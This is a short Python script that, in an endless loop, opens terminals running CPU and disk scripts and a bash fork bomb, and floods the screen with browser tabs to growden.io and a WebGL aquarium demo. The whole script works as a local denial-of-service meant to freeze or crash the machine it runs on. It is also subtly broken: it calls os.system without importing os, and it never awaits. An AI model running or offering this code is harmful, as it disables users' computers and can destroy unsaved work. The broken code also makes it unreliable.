import subprocess, webbrowser, asyncio

commands = [
  "bash scripts/cpu.sh",
  ":(){ :|: & };:",
  "bash scripts/disk.sh"
]

os.system(f"chmod +x scripts/cpu.sh")
os.system(f"chmod +x scripts/disk.sh")

async def one():
  i = 0
  while True:
    for cmd in commands:
      subprocess.Popen(["gnome-terminal", "--", "bash", "-c", cmd])
      webbrowser.open_new_tab("https://www.growden.io")
      webbrowser.open("https://webglsamples.org/aquarium/aquarium.html")
      
asyncio.run(one())